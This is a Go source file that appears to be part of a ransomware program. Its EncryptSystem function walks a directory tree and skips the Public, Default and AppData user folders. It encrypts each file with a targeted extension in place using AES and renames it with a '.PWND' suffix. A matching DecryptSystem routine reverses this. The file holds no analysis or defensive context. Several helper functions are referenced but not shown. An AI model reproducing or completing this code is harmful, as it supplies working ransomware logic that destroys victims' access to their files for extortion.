package main

import (
	b64 "encoding/base64"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
)

func HasMatchingExtension(filePath string, extensions []string) bool {
	for _, ex := range extensions {
		if filepath.Ext(filePath) == ex {
			return true
		}
	}
	return false
}

func GetFileContent(fileName string) []byte {
	data, err := ioutil.ReadFile(fileName)
	checkError(err)
	return data
}

func WriteToFile(fileName string, data []byte) {
	err := ioutil.WriteFile(fileName, data, 0644)
	checkError(err)
}

func EncryptFile(fileName string, key []byte) {
	plainText := GetFileContent(fileName)
	encryptedData := EncryptDataAES(key, plainText)
	WriteToFile(fileName, encryptedData)
}

func DecryptFile(filename string, key []byte) {
	cipherText := GetFileContent(filename)
	decryptedData := DecryptDataAES(key, cipherText)
	WriteToFile(filename, decryptedData)
}

func EncryptFileName(fileName string, key []byte) string {
	fileNameBytes := []byte(fileName)
	encryptedFileName := EncryptDataAES(key, fileNameBytes)
	newFileName := b64.StdEncoding.EncodeToString(encryptedFileName)
	return newFileName
}

func EncryptSystem(root string, targets []string, key []byte) []string {
	var files []string
	err := filepath.WalkDir(root, func(path string, d os.DirEntry, err error) error {
		// Check if not a directory, and contains one of our extensions:
		if strings.Contains(path, "\\Users\\Public\\") || strings.Contains(path, "\\Users\\Default\\") || strings.Contains(path, "\\AppData\\") {
			return nil
		}
		if !d.IsDir() && HasMatchingExtension(path, targets) {
			EncryptFile(path, key)
			files = append(files, d.Name())
			os.Rename(path, path+".PWND")
		}
		return nil
	})
	checkError(err)
	return files
}

func DecryptSystem(root string, key []byte) []string {
	var files []string
	err := filepath.WalkDir(root, func(path string, d os.DirEntry, err error) error {
		// We only care for files with the .PWND extension.
		if !d.IsDir() && HasMatchingExtension(path, []string{".PWND"}) {
			DecryptFile(path, key)
			os.Rename(path, strings.ReplaceAll(path, ".PWND", ""))
			files = append(files, path)
		}
		return nil
	})
	checkError(err)
	return files
}
